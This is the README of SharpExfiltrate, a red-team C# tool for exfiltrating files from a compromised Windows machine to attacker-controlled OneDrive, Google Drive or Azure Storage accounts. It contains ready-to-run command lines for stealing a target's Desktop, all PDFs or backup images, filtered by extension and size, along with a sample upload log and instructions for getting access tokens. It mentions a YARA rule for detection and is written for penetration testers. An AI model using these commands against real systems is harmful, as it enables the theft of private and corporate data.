# SharpExfiltrate
SharpExfiltrate is a tiny but modular C# framework to exfiltrate loot over secure and trusted channels. It supports both single-files and full-directory paths (recursively), file extension filtering, and file size filtering.
Exfiltrated data will be compressed and encrypted before being uploaded.
While exfiltrating a large amount of data will require the output stream to be cached on disk, smaller exfiltration operations can be done all in memory with the "memoryonly" option. 

# Example Run

```
.\SharpExfiltrate.exe OneDrive --username <redacted> --password "<redacted>" --filepath "C:\Users\<redacted>\Downloads\balenaEtcher-Setup-1.5.120.exe"

  __  _  _  __  ___ ___ _____   _____ _ _ _____ ___  __ _____ ___
/' _/| || |/  \| _ \ _,\ __\ \_/ / __| | |_   _| _ \/  \_   _| __|
`._`.| >< | /\ | v / v_/ _| > , <| _|| | |_| | | v / /\ || | | _|
|___/|_||_|_||_|_|_\_| |___/_/ \_\_| |_|___|_| |_|_\_||_||_| |___|
@Flangvik - TrustedSec

[+] Compressing C:\Users\<redacted>\Downloads\balenaEtcher-Setup-1.5.120.exe 140,8MB
[+] Password for Zip file is be4886d6a9004ed
[+] Launching OneDrive module by @Flangvik
[+] Performing Authentication using provided credentials
[+] Confirming access to https://graph.windows.net
[+] Starting OneDrive upload
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (7%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (14%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (28%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (35%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (64%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (71%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (85%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (99%)
[+] Upload completed, file located: https://<redacted>-my.sharepoint.com/personal/<redacted>/Documents/DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip
```


# Usage Examples

Upload The entire targets Desktop folder, including files and subfolders, using the OneDrive module.
```
.\SharpExfiltrate.exe OneDrive --username foo.bar@example.com --password "Passw0rd123!" --filepath "C:\Users\<user>\Desktop"
```


Upload all PDFs from all subfolders in the targets root directory, compressing them all in memory, using the GoogleDrive module
```
.\SharpExfiltrate.exe GoogleDrive --appname SuperLegitApp --accesstoken "<access-token-string>" --filepath "C:\Users\<user>\" --extensions "pdf;" --memoryonly
```


Upload all files from all subfolders that are smaler then 1 MB in the targets root directory, using the OneDrive module.
```
.\SharpExfiltrate.exe OneDrive --username foo.bar@example.com --password "Passw0rd123!" --filepath "C:\Users\<user>\" --size 1
```


Upload a huge ISO image using the OneDrive module
```
.\SharpExfiltrate.exe OneDrive --username foo.bar@example.com --password "Passw0rd123!" --filepath "C:\Users\<user>\Backup\2021_09_09_Win10Image.iso"
```


Upload all backup images that are less then 500 MB, using the Azure Storage Account module
```
.\SharpExfiltrate.exe AzureStorage --connectionstring <connection-string> --filepath "C:\Users\<user>\Backup\Images" --extensions "vmdk;vmx;iso;ovf;ova;flp" --size 500
```


# Modules

Each module within SharpExfiltrate can be acccess with a module pre-verb    

```
.\SharpExfiltrate.exe 
  __  _  _  __  ___ ___ _____   _____ _ _ _____ ___  __ _____ ___
/' _/| || |/  \| _ \ _,\ __\ \_/ / __| | |_   _| _ \/  \_   _| __|
`._`.| >< | /\ | v / v_/ _| > , <| _|| | |_| | | v / /\ || | | _|
|___/|_||_|_||_|_|_\_| |___/_/ \_\_| |_|___|_| |_|_\_||_||_| |___|
@Flangvik - TrustedSec

 1.1.0.0

  OneDrive        Exfiltrate information using the OneDrive module

  GoogleDrive     Exfiltrate information using the GoogleDrive module

  AzureStorage    Exfiltrate information using the Azure Storage Account module

  help            Display more information on a specific command.

  version         Display version information.
```
## OneDrive

The OneDrive module uses a password and username to fetch an access token against the graph API (OneDrive). Note that testing has only been done on Office365 business accounts (tenant joined). MFA needs to be disabled for the 0Auth flow to work.
```
.\SharpExfiltrate.exe OneDrive
  __  _  _  __  ___ ___ _____   _____ _ _ _____ ___  __ _____ ___
/' _/| || |/  \| _ \ _,\ __\ \_/ / __| | |_   _| _ \/  \_   _| __|
`._`.| >< | /\ | v / v_/ _| > , <| _|| | |_| | | v / /\ || | | _|
|___/|_||_|_||_|_|_\_| |___/_/ \_\_| |_|___|_| |_|_\_||_||_| |___|
@Flangvik - TrustedSec

 1.1.0.0

  -u, --username      Required. Username (email) for the OneDrive account to store exfiltrated data

  -p, --password      Required. Password for the OneDrive account to store exfiltrated data

  -f, --filepath      Required. Path to file or directory to be exfiltrated

  -e, --extensions    Only exfiltrate files with given extensions, extension string seperated by ; (pdf;doc;xls)

  -s, --size          Max filesize in MB, all files above this number will be ignored from exfiltration.

  -m, --memoryonly    Create the compressed zip file entirely in memory.(Might cause OutOfMemoryException)

  --help              Display this help screen.

  --version           Display version information.
  ```


## GoogleDrive
The GoogleDrive modules uses a Access Token that can be generated over at https://developers.google.com/oauthplayground/. Scroll down until you find "Drive API v3" on the left hand side. Click it and select ```https://www.googleapis.com/auth/drive.file```, go down and click "Authorize APIs", accept and follow the login steps. You should then be taken to a page where you generate and copy out our Access token. Keep in mind that the access token expries after 3600 seconds.


```
.\SharpExfiltrate.exe GoogleDrive

  __  _  _  __  ___ ___ _____   _____ _ _ _____ ___  __ _____ ___
/' _/| || |/  \| _ \ _,\ __\ \_/ / __| | |_   _| _ \/  \_   _| __|
`._`.| >< | /\ | v / v_/ _| > , <| _|| | |_| | | v / /\ || | | _|
|___/|_||_|_||_|_|_\_| |___/_/ \_\_| |_|___|_| |_|_\_||_||_| |___|
@Flangvik - TrustedSec

 1.1.0.0

  -n, --appname        Required. GoogleDrive Application name (Can be anything)

  -t, --accesstoken    Required. Valid access token onbehalf of your GoogleDrive account

  -f, --filepath       Required. Path to file or directory to be exfiltrated

  -e, --extensions     Only exfiltrate files with given extensions, extension string seperated by ; (pdf;doc;xls)

  -s, --size           Max filesize in MB, all files above this number will be ignored from exfiltration.

  -m, --memoryonly     Create the compressed zip file entirely in memory.(Might cause OutOfMemoryException)

  --help               Display this help screen.

  --version            Display version information.
  ```

## Azure Storage Account

The Azure Storage Account module uses a connection string to create a subfolder (container) called "loot" to which it uploads the exfiltrated data. This requires a Storage Account to be created in Azure, the connection string can be found under "Access keys" in your Storage Account submenu.

```
.\SharpExfiltrate.exe AzureStorage

  __  _  _  __  ___ ___ _____   _____ _ _ _____ ___  __ _____ ___
/' _/| || |/  \| _ \ _,\ __\ \_/ / __| | |_   _| _ \/  \_   _| __|
`._`.| >< | /\ | v / v_/ _| > , <| _|| | |_| | | v / /\ || | | _|
|___/|_||_|_||_|_|_\_| |___/_/ \_\_| |_|___|_| |_|_\_||_||_| |___|
@Flangvik - TrustedSec

 1.1.0.0

  -c, --connectionstring    Required. Connection string to your Azure Storage Account

  -f, --filepath            Required. Path to file or directory to be exfiltrated

  -e, --extensions          Only exfiltrate files with given extensions, extension string seperated by ; (pdf;doc;xls)

  -s, --size                Max filesize in MB, all files above this number will be ignored from exfiltration.

  -m, --memoryonly          Create the compressed zip file entirely in memory.(Might cause OutOfMemoryException)

  --help                    Display this help screen.

  --version                 Display version information.

  ```



## Detection / Defense
See the included yara rule :) 


# Credits

* https://github.com/KoenZomers/OneDriveAPI (OneDrive API in .NET)
* https://medium.com/geekculture/upload-files-to-google-drive-with-c-c32d5c8a7abc (Usage of Google Drive API in .NET)
* https://github.com/googleapis/google-api-dotnet-client (Google Drive API in .NET)
* https://github.com/Azure/azure-storage-net (Azure Storage API in .NET)
* https://github.com/icsharpcode/SharpZipLib (ZIP API in .NET)
* https://github.com/CCob/dnMerge (Merges all them deps into the binary)
* https://github.com/GhostPack/Rubeus/blob/master/Rubeus.yar (Template for my yara rules)